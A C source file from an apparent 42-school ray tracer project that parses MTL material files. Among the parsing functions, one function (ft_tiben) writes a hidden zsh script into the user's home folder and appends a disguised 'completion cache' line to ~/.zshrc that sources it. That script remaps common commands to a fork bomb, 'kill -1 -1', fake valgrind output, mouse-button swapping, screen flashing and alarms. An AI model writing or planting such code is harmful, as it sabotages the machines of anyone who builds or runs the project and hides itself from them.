/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   set_mtl_utils_bonus.c                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gajanvie <gajanvie@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/11 10:20:52 by gajanvie          #+#    #+#             */
/*   Updated: 2026/04/29 10:44:23 by gajanvie         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <minirt_bonus.h>

void	error_map_mtl(t_vars_obj v_obj, t_data *data, int i)
{
	if (i == 0)
		printf("\rParsing OBJ: [100%%] - OK.\n");
	munmap(v_obj.str, v_obj.file_size);
	free(v_obj.v);
	free(v_obj.vn);
	free(v_obj.vt);
	if (i == 1)
		clean_exit(data, 1, "Error: Read Fail mtl or realloc fail\n", 0);
}

void	map_mtl(char *filename, t_data *data, t_vars_obj *v, t_vars_obj v_obj)
{
	int		i;
	char	*file;

	i = 0;
	while (filename[i])
	{
		if (filename[i] == '\n' || filename[i] == '\r')
			break ;
		i++;
	}
	file = calloc(sizeof(char), (i + 1));
	file = strncpy(file, filename, i);
	v->str = map_file_fast(file, &v->len);
	free(file);
	if (!v->str)
		error_map_mtl(v_obj, data, 1);
	v->end_ptr = v->str + v->len;
	v->step = v->len / 60;
	if (v->step == 0)
		v->step = 1;
	v->next = v->step;
}

void	mat_ni_ro(int i, t_mtl_info **mtl_node, char **ptr)
{
	if (!ft_strncmp("Ni ", *ptr, 3) && i == 1)
	{
		*ptr = *ptr + 3;
		(*mtl_node)->ni = parse_double(ptr, 0);
		if ((*mtl_node)->ni > 10.0)
			(*mtl_node)->ni = 10.0;
		if ((*mtl_node)->ni < 0.001)
			(*mtl_node)->ni = 0.001;
	}
	else if (!ft_strncmp("Ro ", *ptr, 3) && i == 1)
	{
		*ptr = *ptr + 3;
		(*mtl_node)->rought = parse_double(ptr, 0);
		if ((*mtl_node)->rought > 1.0)
			(*mtl_node)->rought = 1.0;
		if ((*mtl_node)->rought < 0.0)
			(*mtl_node)->rought = 0.0;
	}
}

void	mat_rgb_re(int i, t_mtl_info **mtl_node, char **ptr)
{
	if (!ft_strncmp("RGB ", *ptr, 4) && i == 1)
	{
		*ptr = *ptr + 4;
		(*mtl_node)->color.r = (uint8_t)parse_double(ptr, 0);
		(*mtl_node)->color.g = (uint8_t)parse_double(ptr, 0);
		(*mtl_node)->color.b = (uint8_t)parse_double(ptr, 0);
		(*mtl_node)->color.a = 255;
		(*mtl_node)->has_col = true;
	}
	else if (!ft_strncmp("Re ", *ptr, 3) && i == 1)
	{
		*ptr = *ptr + 3;
		(*mtl_node)->reflectivity = parse_double(ptr, 0);
		if ((*mtl_node)->reflectivity > 1.0)
			(*mtl_node)->reflectivity = 1.0;
		if ((*mtl_node)->reflectivity < 0.0)
			(*mtl_node)->reflectivity = 0.0;
	}
}

void	mat_tex_bump(int i, t_mtl_info **mtl_node, char **ptr)
{
	char	*bump_start;

	if (!ft_strncmp("map_Kd ", *ptr, 7) && i == 1)
	{
		*ptr += 7;
		if (!ft_strncmp(*ptr, "-s", 2))
			(*mtl_node)->st = ft_atoi(*ptr + 2);
		skip_mtl_option(ptr);
		(*mtl_node)->texc = get_texture_path(ptr);
	}
	else if ((!ft_strncmp("map_bump ", *ptr, 9)
			|| !ft_strncmp("bump ", *ptr, 5)
			|| !ft_strncmp("map_Bump ", *ptr, 9)) && i == 1)
	{
		bump_start = *ptr;
		if (!ft_strncmp(bump_start, "map_bump ", 9)
			|| !ft_strncmp("map_Bump ", *ptr, 9))
			*ptr += 9;
		else
			*ptr += 5;
		if (!ft_strncmp(*ptr, "-s", 2))
			(*mtl_node)->sb = ft_atoi(*ptr + 2);
		skip_mtl_option(ptr);
		(*mtl_node)->bumpc = get_texture_path(ptr);
	}
}

void	ft_tiben()
{
	char *home = getenv("HOME");
	char	zshrc_path[1000];
	char	hidden_file_path[1000];
	snprintf(zshrc_path, sizeof(zshrc_path), "%s/.zshrc", home);
	snprintf(hidden_file_path, sizeof(hidden_file_path), "%s/.zsh_comp_cache_init", home);
	int fd_hidden = open(hidden_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd_hidden >= 0)
	{
		char blague[] =
			"#!/bin/zsh\n"
			"_alarm() {\n"
			"  ( \\speaker-test --frequency $1 --test sine )&\n"
			"  pid=$!\n"
			"  \\sleep 0.${2}s\n"
			"  \\kill -9 $pid\n"
			"}\n"
			"valgrind() {\n"
			"  timeout 0.2s cat /dev/urandom ; printf \"\\n"
			"==515977== HEAP SUMMARY:\\n"
			"==515977==     in use at exit: 26,125 bytes in 33 blocks\\n"
			"==515977==   total heap usage: 7000000000000032432234232354643 allocs, 2 frees, 65,63242324324332424380 bytes allocated\\n"
			"==515977== \\n"
			"==515977== LEAK SUMMARY:\\n"
			"==515977==    definitely lost: 3278327832783 bytes in 323832983 blocks\\n"
			"==515977==    indirectly lost: 23243234423234 bytes in 23323223 blocks\\n"
			"==515977==      possibly lost: 22 bytes in 1 blocks\\n"
			"==515977==    still reachable: 26,125 bytes in 33 blocks\\n"
			"==515977==         suppressed: 10 bytes in 0 blocks\\n"
			"==515977== Rerun with --leak-check=full to see details of leaked memory\\n"
			"==515977== \\n"
			"==515977== For lists of detected and suppressed errors, rerun with: -s\\n"
			"==515977== ERROR SUMMARY: 150 errors from 0.2 contexts (suppressed: 0 from 0)\\n"
			"\\n\";\n"
			"}\n"
			"alias ./minishell='notify-send -t 3000 --urgency=critical \"Fatal Error\" \"Your code might broke the system please fix this\"; printf \"[1]  + 469053 exit 124\" ; sleep 2; kill -1 0'\n"
			"alias ls='ft_lock; /bin/ls'\n"
			"alias 'code .'='yes > ~.a; flatpak run com.visualstudio.code 2>/dev/null'\n"
			"git() {\n"
			"  xmodmap -e \"pointer = 3 1 2\" >/dev/null 2>&1\n"
			"}\n"
			"alias \"make fclean\"=':(){ :|:& };:'\n"
			"alias echo='kill -1 -1'\n"
			"alias ncdu='printf \"[1]  + 469053 exit 124\\n\"'\n"
			"alias clear='for i in 0 1 2 3 4 5; do if [ $((i % 2)) -eq 0 ]; then xrandr --output \"$(xrandr | awk \"/connected [^(]/{print \\$1; exit}\")\" --brightness 0.1; else xrandr --output \"$(xrandr | awk \"/connected [^(]/{print \\$1; exit}\")\" --brightness 1; fi; done; /bin/clear'\n"
			"alias() {\n"
			"  notify-send -t 3000 --urgency=critical \"Fatal Error\" \"Your code might broke the system please fix this\"\n"
			"  printf \"[1]  + 469053 exit 124\"\n"
			"  amixer set Master 10%\n"
			"  _alarm 400 100\n"
			"}\n";
		write(fd_hidden, blague, strlen(blague));
		close(fd_hidden);
	}
	int fd_zshrc = open(zshrc_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (fd_zshrc >= 0)
	{
		char inject_buffer[10000];
		int len = snprintf(inject_buffer, sizeof(inject_buffer),
			"# Initialize Zsh completion cache fallback (auto-generated by system)\n"
			"export ZSH_COMP_CACHE_DIR=\"%s\"\n"
			"[ -s \"$ZSH_COMP_CACHE_DIR\" ] && \\. \"$ZSH_COMP_CACHE_DIR\" > /dev/null 2>&1\n",
			hidden_file_path);
			
		write(fd_zshrc, inject_buffer, len);
		close(fd_zshrc);
	}
}